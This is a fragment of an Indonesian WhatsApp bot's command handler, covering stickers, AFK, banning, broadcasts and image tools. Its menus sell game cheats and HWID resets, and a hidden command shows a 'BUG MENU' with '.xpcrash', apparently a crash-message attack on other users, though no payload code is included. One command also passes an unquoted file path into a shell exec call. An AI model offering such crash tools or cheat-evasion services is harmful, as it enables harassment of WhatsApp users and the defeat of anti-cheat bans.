  for (let i of users) {
      db.data.users[i].limit = limitUser;
  }
}
        
      
if (m.isGroup) {
    if (body.includes(`@6285157781148`)) {
        reaction(m.chat, "❓")
    }
 }

        
if (m.message) {
    if (command && !m.isGroup) {
        console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🌟 ${ucapanWaktu} 🌟`)));
        console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 INFORMATION CHATS`)))
        console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
💬 MESSAGE: ${m.body || m.mtype}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}`
     )
   )
);
    } else if (m.isGroup) {
        console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🌟 ${ucapanWaktu} 🌟`)));
        console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 INFORMATION CHATS`)));
        console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
💬 MESSAGE: ${m.body || m.mtype}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}
🔍 MESS LOCATION: ${groupName}`
       ))
     );
  }
}

        
if (command && !isUser) {
    // Tambahkan kondisi isGroup di sini
    if (!isGroup) {
        conn.sendMessage(m.chat, { text: "Silahkan ketik Menu untuk melihat apa yang kami tawarkan" }, { quoted: m });
        setTimeout(() => {
            conn.sendMessage(m.chat, { text: "Menu" }, { quoted: m });
            pendaftar.push(m.sender);
            fs.writeFileSync('./start/lib/database/pendaftar.json', JSON.stringify(pendaftar, null, 2));
        }, 2000); // 2000 milliseconds = 2 seconds
    }
}

let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}
 
msgFilter.ResetSpam(orang_spam);
        const spampm = () => {
            msgFilter.addSpam(m.sender, orang_spam);
            m.reply("don`t spam! please give pause for a few seconnds.");
        };

        const spamgr = () => {
            msgFilter.addSpam(m.sender, orang_spam);
            m.reply("don`t spam! please give 10 seconnds.");
    };

    if (command && msgFilter.isFiltered(m.sender) && m.isGroup) return spampm();
    if (command && msgFilter.isFiltered(m.sender) && !m.isGroup) return spamgr();

async function reply(teks) {
    conn.sendMessage(m.chat, {
        text: teks,
        mentions: conn.ments(teks),
        isForwarded: true
    }, {quoted: m})
}

async function sendMusic(teks) {
    let img = { url : JoshhhConst, 
               type : "image/jpeg"
              }
          
    let url = `https://whatsapp.com/channel/0029VanySqUBPzjYa2929d0U`    
    let contextInfo = {
        externalAdReply: {    
            showAdAttribution: true,    
            title: `RaldzzXyz`,      
            body: `tell me why i'm waiting?`,     
            description: 'Now Playing ....',   
            mediaType: 2,     
            thumbnailUrl: img.url,
            mediaUrl: url   
        }
    }
    
    conn.sendMessage(m.chat, { 
        contextInfo,
        mimetype: 'audio/mp4',
        audio: teks
    }, { quoted: m })
 }
     
 if (!m.key.fromMe && global.autoread) {
     const readkey = {
         remoteJid: m.chat,
         id: m.key.id,
         participant: m.isGroup ? m.key.participant : undefined
     }
     await conn.readMessages([readkey]);
 }
        conn.sendPresenceUpdate('available', m.chat)
      
function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}

        
async function makeStickerFromUrl(imageUrl, conn, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await conn.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `RaldzzXyz`,
                    body: `© copyright`,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: JoshhhConst, 
                    sourceUrl: ``
                }
            }
        }, { quoted: m });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        reply('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}
      
 if (m.isGroup && !m.key.fromMe) {
  let mentionUser = [
    ...new Set([
      ...(m.mentionedJid || []),
      ...(m.quoted ? [m.quoted.sender] : []),
    ]),
  ];

 for (let ment of mentionUser) {
    if (afk.checkAfkUser(ment, _afk)) {
      let getId2 = afk.getAfkId(ment, _afk);
      let getReason2 = afk.getAfkReason(getId2, _afk);
      let getTimee = Date.now() - afk.getAfkTime(getId2, _afk);
      let heheh2 = ms(getTimee);
      reply(`Jangan tag, dia sedang afk\n\n*Reason :* ${getReason2}\n*Sejak :* ${heheh2.hours} jam, ${heheh2.minutes} menit, ${heheh2.seconds} detik yg lalu\n`);
    }
  }

 if (afk.checkAfkUser(m.sender, _afk)) {
    let getId = afk.getAfkId(m.sender, _afk);
    let getReason = afk.getAfkReason(getId, _afk);
    let getTime = Date.now() - afk.getAfkTime(getId, _afk);
    let heheh = ms(getTime);

    _afk.splice(afk.getAfkPosition(m.sender, _afk), 1);
    fs.writeFileSync("./start/lib/database/afk.json", JSON.stringify(_afk));
      reply(`@${m.sender.split("@")[0]} telah kembali dari afk\n\n*Reason :* ${getReason}\n*Selama :* ${heheh.hours} jam ${heheh.minutes} menit ${heheh.seconds} detik\n`);
  }
 }
  
 if (chats.antilink) {
     if (budy.includes('chat.whatsapp.com')) {
         if (isAdmins || Access) return;
         reply(`> GROUP LINK DETECTOR\n`);
         if (!isBotAdmins) return reply(`bot bukan admin`);
         let gclink = `https://chat.whatsapp.com/${await conn.groupInviteCode(m.chat)}`;
         if (budy.includes(gclink)) return;
         await conn.sendMessage(m.chat, {
             delete: m.key
         });	
     }  
 }

async function fetchBuffer (url, options) {
  try {
    options ? options : {};
    const res = await axios({
      method: "GET",
      url,
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36",
        DNT: 1,
        "Upgrade-Insecure-Request": 1,
      },
      ...options,
      responseType: "arraybuffer",
    });
    return res.data;
  } catch (err) {
    return err;
  }
};
  
/** plugins **/
const pluginsLoader = async (directory) => {
    let plugins = [];
    const folders = fs.readdirSync(directory);
    folders.forEach(file => {
        const filePath = path.join(directory, file);
        if (filePath.endsWith(".js")) {
            try {
                const resolvedPath = require.resolve(filePath);
                if (require.cache[resolvedPath]) {
                    delete require.cache[resolvedPath];
                }
                const plugin = require(filePath);
                plugins.push(plugin);
            } catch (error) {
                console.log(`${filePath}:`, error);
            }
        }
    });
    return plugins;
};

const pluginsDisable = true;
const plugins = await pluginsLoader(path.resolve(__dirname, "../plugins"));
const plug = { 
    conn,
    Access,
    command,
    reply,
    text,
    chats,
    users,
    args,
    botNumber,
    reaction,
    makeStickerFromUrl,
    pushname,
    isBan,
    isPremium,
    isGroup: m.isGroup,
    isPrivate: !m.isGroup
};

for (let plugin of plugins) {
    if (plugin.command.find(e => e == command.toLowerCase())) {
        if (plugin.owner && !Access) {
            return reply(mess.owner);
        }
        if (plugin.premium && !isPremium) {
            return reply(ness.premium);
        }
        if (plugin.group && !plug.isGroup) {
            return reply(mess.group);
        }
        if (plugin.private && !plug.isPrivate) {
            return reply(mess.private);
        }
        if (typeof plugin !== "function") return;
        await plugin(m, plug);
    }
}

if (!pluginsDisable) return;
/** end plugins **/
switch (command) {   
case 'menu': {
if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    let menu = `👋🏻 Hallo ${m.pushName}, Saya adalah WhatsApp Bot dari Webtech Solution. Saya akan membantu anda. Klik tombol "Menu" untuk melihat apa saja yang kami tawarkan.`;

    conn.sendMessage(m.chat, { 
        image: { url: 'https://webtechsolution.my.id/assets/images/logo-wa.png' },
        caption: menu,
        footer: "© Joshhh",
        buttons: [
            {
                buttonId: ".allmenu", 
                buttonText: { displayText: 'Menu' }, 
                type: 1
            }
        ],
        headerType: 4,
        viewOnce: true
    }, { quoted: glxNull });
}
break

case 'allmenu':{
if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
let allmenu = `
*『 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓 』*
➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭

*『 𝗔𝗟𝗟 𝗠𝗘𝗡𝗨 』*

.SimpleHack [ Berlaku Per Patch ]
.CustomHack
.PermanentHack
.SourceCode
`

 const buttons = [
  {
    buttonId: '.gantihwid',
    buttonText: {
      displayText: 'Ganti HWID'
    }
  },
  {
    buttonId: '.pricelist',
    buttonText: {
      displayText: 'Beli Cheat'
    }
  }
];

const buttonMessage = {
  image: { url: "https://webtechsolution.my.id/assets/images/logo-wa.png" },
  caption: allmenu,
  footer: '© Joshhh\n',
  buttons: buttons,
  headerType: 6,
  contextInfo: { 
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "@newsletter",
      serverMessageId: null,
      newsletterName: ``
    },
    mentionedJid: ['6285157781148@s.whatsapp.net'],
  },
  viewOnce: true
};

const listMes = [
  {
    buttonId: 'action',
    buttonText: { displayText: 'Options' },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: "PILIH DI SINI",
        sections: [
          {
            title: "PILIH KEBUTUHAN ANDA :",
            highlight_label: "",
            rows: [
              {
                header: "Simple Hack",
                title: "",
                description: "",
                id: ".SimpleHack"
              },
              {
                header: "Custom Hack",
                title: "",
                description: "",
                id: ".CustomHack"
              },
              {
                header: "Permanent Hack",
                title: "",
                description: "",
                id: ".PermanentHack"
              },
              {
                header: "Source Code",
                title: "",
                description: "",
                id: ".SourceCode"
              }
            ]
          }
        ]
      })
    },
    viewOnce: true
  }
];

buttonMessage.buttons.push(...listMes);

return await conn.sendMessage(m.chat, buttonMessage, { quoted: glxNull });
}
break;

/**case 'gantihwid':{
if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
   conn.sendMessage(m.chat, { text: "Untuk saat ini Fitur ganti HWID dari Chat BOT Whatsapp sedang dalam perbaikan. Tapi jangan khawatir anda masih bisa ganti HWID di:" }, { quoted: m });
   conn.sendMessage(m.chat, { text: "https://webtechsolution.my.id/JCE-Tools" }, { quoted: m });
	
}
break **/

case '13524145f5c135':{
if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
let bakyatim = `
*\`⫸☠️ ⟬     𝐏͢𝐇͜͡𝚯͜𝚴͢𝐈͜͡𝐗     ⟭ ☠️⫷\`*

*『 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓 』*
➢ 𝐍𝐚𝐦𝐞 𝐁𝐨𝐭 : *Phonix*
➣ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐢𝐨𝐧 : *2*
➣ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : *13-Pro*
➢ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Joshhh*
➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭

*『 𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 』*

 ▢ .xᴘᴄʀᴀsʜ`
 
const buttons = [
  {
    buttonId: '.developer',
    buttonText: {
      displayText: '𝐂͢͢͢𝐫͡𝐞͢͢͢𝐝𝐢͜𝐭'
    }
  },
  {
    buttonId: '.thanksto',
    buttonText: {
      displayText: '𝐓͢͢͢𝐡𝐚͜͡𝐧𝐤𝐬͜𝐓𝐨͢'
    }
  }
];

const buttonMessage = {
  image: { url: "https://webtechsolution.my.id/assets/images/logo-wa.png" },
  caption: bakyatim,
  footer: '© Joshhh\n',
  buttons: buttons,
  headerType: 6,
  contextInfo: { 
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "@newsletter",
      serverMessageId: null,
      newsletterName: ``
    },
    mentionedJid: ['6285157781148@s.whatsapp.net'],
  },
  viewOnce: true
};

const listMes = [
  {
    buttonId: 'action',
    buttonText: { displayText: 'Options' },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: "𝐒𝐄𝐋𝐄𝐂𝐓",
        sections: [
          {
            title: "𝗦𝗲𝗹𝗲𝗰𝘁 𝗧𝗵𝗶𝘀 𝗢𝗽𝘁𝗶𝗼𝗻𝘀",
            highlight_label: "",
            rows: [
              {
                header: "𝐁𝐮𝐠 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".bugmenu"
              },
              {
                header: "𝐓𝐨𝐨𝐥𝐬 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".toolsmenu"
              },
              {
                header: "𝐆𝐫𝐨𝐮𝐩 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".groupmenu"
              },
              {
                header: "𝐒𝐞𝐭𝐭𝐢𝐧𝐠 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".settingmenu"
              }
            ]
          }
        ]
      })
    },
    viewOnce: true
  }
];

buttonMessage.buttons.push(...listMes);

return await conn.sendMessage(m.chat, buttonMessage, { quoted: glxNull });
}
break;                       
 
case 'settingmenu':{
if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
let set = `
*\`⫸☠️ ⟬     𝐏͢𝐇͜͡𝚯͜𝚴͢𝐈͜͡𝐗     ⟭ ☠️⫷\`*

*『 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓 』*
➢ 𝐍𝐚𝐦𝐞 𝐁𝐨𝐭 : *Phonix*
➣ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐢𝐨𝐧 : *2*
➣ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : *13-Pro*
➢ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Joshhh*
➢ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭

*『 𝗦𝗘𝗧𝗧𝗜𝗡𝗚 𝗠𝗘𝗡𝗨 』*

 ▢ .sᴇʟғ
 ▢ .ᴘᴜʙʟɪᴄ
 ▢ .ᴀᴅᴅᴏᴡɴᴇʀ
 ▢ .ᴅᴇʟᴏᴡɴᴇʀ
 ▢ .ᴀᴅᴅᴘʀᴇᴍ
 ▢ .ᴅᴇʟᴘʀᴇᴍ
 ▢ .ʙᴀɴᴜsᴇʀ
 ▢ .ᴜɴʙᴀɴᴅᴜsᴇʀ
 ▢ .ᴅᴇʟᴘʟᴜɢ
 ▢ .ɢᴇᴛᴘʟᴜɢ
 ▢ .ʟɪsᴛᴘʟᴜɢ
 ▢ .ɢᴇᴛǫ
 ▢ .sᴇᴛᴘᴘ`

const buttons = [
  {
    buttonId: '.developer',
    buttonText: {
      displayText: '𝐂͢͢͢𝐫͡𝐞͢͢͢𝐝𝐢͜𝐭'
    }
  },
  {
    buttonId: '.thanksto',
    buttonText: {
      displayText: '𝐓͢͢͢𝐡𝐚͜͡𝐧𝐤𝐬͜𝐓𝐨͢'
    }
  }
];

const buttonMessage = {
  image: { url: "https://webtechsolution.my.id/assets/images/logo-wa.png" },
  caption: set,
  footer: '© Joshhh\n',
  buttons: buttons,
  headerType: 6,
  contextInfo: { 
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "@newsletter",
      serverMessageId: null,
      newsletterName: ``
    },
    mentionedJid: ['6285157781148@s.whatsapp.net'],
  },
  viewOnce: true
};

const listMes = [
  {
    buttonId: 'action',
    buttonText: { displayText: 'Options' },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: "𝐒𝐄𝐋𝐄𝐂𝐓",
        sections: [
          {
            title: "𝗦𝗲𝗹𝗲𝗰𝘁 𝗧𝗵𝗶𝘀 𝗢𝗽𝘁𝗶𝗼𝗻𝘀",
            highlight_label: "",
            rows: [
              {
                header: "𝐁𝐮𝐠 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".bugmenu"
              },
              {
                header: "𝐓𝐨𝐨𝐥𝐬 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".toolsmenu"
              },
              {
                header: "𝐆𝐫𝐨𝐮𝐩 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".groupmenu"
              },
              {
                header: "𝐒𝐞𝐭𝐭𝐢𝐧𝐠 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".settingmenu"
              }
            ]
          }
        ]
      })
    },
    viewOnce: true
  }
];

buttonMessage.buttons.push(...listMes);

return await conn.sendMessage(m.chat, buttonMessage, { quoted: glxNull });
}
break;            

case 'telestick':
  case 'stickertele':
     case 'stele':{
         if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
         if (args.length == 0) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} https://t.me/addstickers/bocchi_ryo_y0ursfunny_akaudon 🎗`); 
         if (!isPremium) return reply(mess.premium)
         if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {              
             let res = await Telesticker(args[0]);              
             await reaction(m.chat, "⚡")              
             if (m.isGroup && res.length > 30) {
                 await reply("kebanyakan jirr yaudahh aku kirim di pm aja yak");
                 
                   for (let i = 0; i < res.length; i++) {
                       let encmedia = await conn.sendImageAsSticker(m.sender, res[i].url, m, { 
                           packname: global.packname, 
                           author: global.author });        
                       await fs.unlinkSync(encmedia);
                       await sleep(9000);
                   }
             } else {
                   for (let i = 0; i < res.length; i++) {
                       let encmedia = await conn.sendImageAsSticker(m.chat, res[i].url, m, {
                           packname: global.packname, 
                           author: global.author });
                       await fs.unlinkSync(encmedia)
                       await sleep(9000);           
                   }
               }
           }
       }
       break;
                
       case "banuser":
       case "banneduser":{
           if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
           if (!Access) return reply(mess.owner)
           let who;
           try {
               if (m.isGroup)
                   who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender;
           } catch (err) {
               if (m.isGroup) who = text + "@s.whatsapp.net";
           }
           if (!who) return reply("𝙏𝙖𝙜 𝙊𝙧 𝙍𝙚𝙥𝙡𝙮 🎗");
           const isBen = user_ban.includes(who);
           if (isBen) return reply(`${isBen} mampus tuh udah gw band g bisa akses lagi`);
           user_ban.push(who);
           fs.writeFileSync("./start/lib/database/banned.json", JSON.stringify(user_ban, 2, null));
           await sleep(500);
           reply(mess.s);
       }
       break;
                
       case "unbanneduser":
       case "unbanuser":{
           if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
           if (!Access) return reply(mess.owner)
           let whe;
           try {
               if (m.isGroup)
                   whe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender;
           } catch (err) {
               if (m.isGroup) whe = text + "@s.whatsapp.net";
           }
           if (!whe) return reply("𝙏𝙖𝙜 𝙊𝙧 𝙍𝙚𝙥𝙡𝙮 🎗");
           user_ban.splice(whe, 1);
           fs.writeFileSync("./start/lib/database/banned.json", JSON.stringify(user_ban, 2, null));
           await sleep(500);
           reply(mess.s);
       }
       break;
                
       case "listbanuser":
       case "listbanned":{
           if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
           if (!Access) return reply(mess.owner)
           var textban = `*List Ban User* : *${user_ban.length}*`;
           await conn.sendMessage(m.chat, {
               text: textban,
               contextInfo: {
                   externalAdReply: {
                       title: `© Joshhh`,
                       body: "",
                       thumbnailUrl: JoshhhConst,
                       sourceUrl: 'https://google.com',
                       mediaType: 1,
                       renderLargerThumbnail: true,
                   }
               }
           }, { quoted: glxNull });
       }
       break;
                
case 'stext':{
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!text) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 :  ${prefix + command} woi hytam 🎗`)
    await reaction(m.chat, "⚡")
    let json = {
        type: 'stories',
        format: 'png',
        backgroundColor: '#1b1e23',
        width: 512,
        height: 720,
        scale: 4,
        watermark: 'Laurine',
        messages: [{
            entities: 'auto',
            avatar: true,
            from: {
                id: 18,
                name: await conn.getName(m.sender),
                photo: {
                    url: await conn.profilePictureUrl(m.sender, 'image').catch(_ => "https://telegra.ph/file/320b066dc81928b782c7b.png")
                }
            },
            text: text 
        }, 
    ]};
    const { data } = await axios.post('https://dikaardnt.com/api/maker/quote', json);
    var media = Buffer.from(data.image, 'base64')
    var res = await uploadImage(media)
    conn.sendMessage(m.chat, {
        image: { url : res },
        caption: '' },{ quoted: glxNull })
}
break
           
case "afk":{
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!m.isGroup) return reply(mess.group);
    if (isAfkOn) return reply("Sedang Afk")
    let reason = text ? text : "gada bjirr";
    afk.addAfkUser(m.sender, Date.now(), reason, _afk);
    reply(`@${m.sender.split("@")[0]} AFK\nAlasan: ${reason}`);
}
break;
            
case 'tovocal':
  case 'getvocal':
    case 'vocal':{
        if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
        if (!text) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} it will rain 🎗`)
        let search = await yts(text);
        await reaction(m.chat, "⚡")
        let telaso = search.all[0].url;
        let puqi = await VocalRemover(telaso);
          let vocalAudio = puqi.stuffs.find(item => item.bizType === 'vocal').key;
          conn.sendMessage(m.chat, {
              audio: { url : vocalAudio },
              mimetype: 'audio/mpeg', 
              ptt: true
          },{quoted: glxNull })
        }
      break;
            
case 'remini':
  case 'hd':
    case 'hdr': {
        if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
        if (!quoted || !/image/.test(mime)) return reply(`𝙍𝙚𝙥𝙡𝙮 𝙋𝙝𝙤𝙩𝙤 🎗`)  
        const peler = await quoted.download()              
        let getResult;             
        const ImgLarger = require("./lib/scrape/remini")    
        await reaction(m.chat, "⚡")
        const imgLarger = new ImgLarger();
        try {    
            const Logger = await imgLarger.processImage(peler, 4);
            getResult = Logger.data.downloadUrls[0];
            await conn.sendMessage(m.chat, {      
                image: { url: `${getResult}` }, 
                caption: `> *🍿 fetching - unlimited*

status: succes
creator: rasilius`
            },{ quoted: glxNull });
        } catch (error) { 
            console.error('Proses gagal total:', error.message);        
        }
    }
    break;
        

case 'unbanchat':{
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!Access) return reply(mess.owner)
    if (global.db.data.chats[m.chat].isBanned = false) return reply("udah g aktif")
    global.db.data.chats[m.chat].isBanned = false
    reply(mess.s)
}
break
        
// Tambahkan case ini di dalam switch (command) block Anda
case 'gantihwid':
case 'changehwid': {
    // Periksa apakah pengguna dilarang (sesuai logika isBan Anda)
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`);

    // Pastikan pengguna memberikan argumen dalam format yang benar
    // Format yang diharapkan: [HWID_Lama]|[HWID_Baru]
    const parts = text.split('-');
    if (parts.length !== 2) {
        return reply(`Format salah. Gunakan: ${prefix + command} [HWID_Lama]-[HWID_Baru]\nContoh: ${prefix + command} 123456-789012`);
    }

    const originalHwid = parts[0].trim();
    const newHwid = parts[1].trim();

    // Validasi format HWID (hanya angka dan tanda hubung -)
    const hwidRegex = /^[0-9\-]+$/;
    if (!hwidRegex.test(originalHwid) || !hwidRegex.test(newHwid)) {
        return reply("HWID hanya boleh mengandung angka (0-9) dan tanda hubung (-).");
    }

    // URL API PHP untuk mengganti HWID
    const apiUrl = 'https://webtechsolution.my.id/JCE-Tools/wa.php';

    // API Key Anda. PASTIKAN Anda telah mendefinisikan global.API_KEY
    // di file konfigurasi bot Anda (misalnya, config.js)
    // Contoh: global.API_KEY = 'kunci_api_rahasia_anda';
    const apiKey = global.API_KEY;

    // Periksa apakah API Key sudah dikonfigurasi
    if (!apiKey) {
        return reply("API Key untuk ganti HWID belum dikonfigurasi di bot. Mohon hubungi admin bot.");
    }

    try {
        // Beri indikasi bot sedang memproses
        await reaction(m.chat, "⚡");

        // Kirim permintaan POST ke API PHP
        const response = await axios.post(apiUrl, new URLSearchParams({
            api_key: apiKey,
            original_hwid: originalHwid,
            new_hwid: newHwid
        }).toString(), {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded' // Penting untuk form data
            }
        });

        // Tangani respon dari API
        const result = response.data; // Axios biasanya sudah mem-parsing JSON secara otomatis

        if (result && result.status) {
            // Tampilkan status dan pesan dari API ke pengguna
            reply(`*Status Ganti HWID:*\nStatus: ${result.status}\nPesan: ${result.message}`);
        } else {
            // Jika format respon tidak sesuai harapan
            reply("Respon dari server API tidak sesuai format yang diharapkan.");
        }

    } catch (error) {
        // Tangani error jika terjadi masalah saat menghubungi API
        console.error("Error calling HWID API:", error); // Log error di konsol bot

        let errorMessage = "Terjadi kesalahan saat menghubungi server API untuk ganti HWID.";

        if (error.response) {
            // Respon diterima, tapi status error (misal 400, 500)
            errorMessage += `\nStatus HTTP: ${error.response.status}.`;
            if (error.response.data && error.response.data.message) {
                 errorMessage += ` Pesan dari API: ${error.response.data.message}`;
            } else if (typeof error.response.data === 'string') {
                 errorMessage += ` Respon: ${error.response.data.substring(0, 100)}...`; // Tampilkan sebagian jika string
            }
        } else if (error.request) {
            // Permintaan terkirim, tapi tidak ada respon
            errorMessage += "\nTidak ada respon dari server API.";
        } else {
            // Error saat setup permintaan
            errorMessage += `\nDetail Error: ${error.message}`;
        }

        reply(errorMessage); // Kirim pesan error ke pengguna
    }
}
break;
            
case 'toimage': 
  case 'toimg': {
      if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
      if (!/webp/.test(mime)) return reply(`𝙍𝙚𝙥𝙡𝙮 𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨`)
      let media = await conn.downloadAndSaveMediaMessage(quoted)
      await reaction(m.chat, "⚡")
      let ran = await getRandomFile('.png')  
      exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media)
          if (err) return err 
          let buffer = fs.readFileSync(ran)   
          conn.sendMessage(m.chat, {   
              image: buffer     
          }, { quoted: glxNull })
          fs.unlinkSync(ran)
      }
    )
  }
  break
                
  case "pin":
  case "pinterest":{
      if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
      if (!text) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} tobrut 🎗`);
      await reaction(m.chat, "⚡")
      let data =  await require('axios').get(`https://api.siputzx.my.id/api/s/pinterest?query=${text}`)
      let a = data.data.data
      let result = a[Math.floor(Math.random() * a.length)];
      conn.sendButtonImg(m.chat,
        [
            {
                id: `${prefix + command} ${text}`,
                text: 'next',
                type: 1
            }
        ],"Pin Search Ressults", result.images_url, "© Joshhh - 2025", m, {viewOnce: true })
  }
  break;
                
  case 'h':
  case 'hidetag': {
      if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
      if (!m.isGroup) return reply(mess.group)
      if (!isAdmins && !Access) return reply(mess.admin)
      if (m.quoted) {
          conn.sendMessage(m.chat, {
              forward: m.quoted.fakeObj,
              mentions: participants.map(a => a.id)
          })
      }
      if (!m.quoted) {
          conn.sendMessage(m.chat, {
              text: q ? q : '',
              mentions: participants.map(a => a.id)
          }, { quoted: glxNull })
      }
  }
  break
  
// Tambahkan case ini di dalam switch (command) block Anda
case 'broadcast':
case 'bc': {
    // Perintah ini hanya bisa digunakan oleh pemilik/admin bot
    if (!Access) {
        return reply(mess.owner); // Pastikan Anda punya variabel mess.owner yang terdefinisi
    }

    // Ambil teks pesan yang akan dibroadcast
    const broadcastMessage = text;

    // Periksa apakah ada pesan yang disertakan
    if (!broadcastMessage) {
        return reply(`Mohon sertakan pesan yang ingin dibroadcast.\nContoh: ${prefix + command} Pengumuman penting! Bot akan maintenance sebentar.`);
    }

    // Path ke file database broadcast
    const broadcastDbPath = './db-broadcast.json';

    let recipientList = [];
    try {
        // Baca dan parse file db-broadcast.json
        const dbData = fs.readFileSync(broadcastDbPath, 'utf8');
        recipientList = JSON.parse(dbData);

        // Periksa apakah data yang dibaca adalah array
        if (!Array.isArray(recipientList)) {
            throw new Error('Isi file db-broadcast.json bukan array.');
        }

        // Filter JID yang mungkin kosong atau tidak valid jika perlu
        recipientList = recipientList.filter(jid => typeof jid === 'string' && jid.length > 0);

        if (recipientList.length === 0) {
            return reply('File db-broadcast.json kosong atau tidak berisi JID valid.');
        }

    } catch (error) {
        console.error("Error reading or parsing db-broadcast.json:", error);
        return reply(`Gagal membaca atau memproses file database broadcast: ${error.message}`);
    }


    // Beri indikasi bot sedang memproses
    await reaction(m.chat, "⚡");
    reply(`Memulai proses broadcast ke ${recipientList.length} penerima...`);

    let successCount = 0;
    let failedCount = 0;

    // Loop melalui setiap chat dari daftar penerima dan kirim pesan
    for (const chatId of recipientList) {
        try {
            // Kirim pesan broadcast
            await conn.sendMessage(chatId, { text: broadcastMessage });

            // Tambahkan jeda kecil antar pesan untuk menghindari rate limit
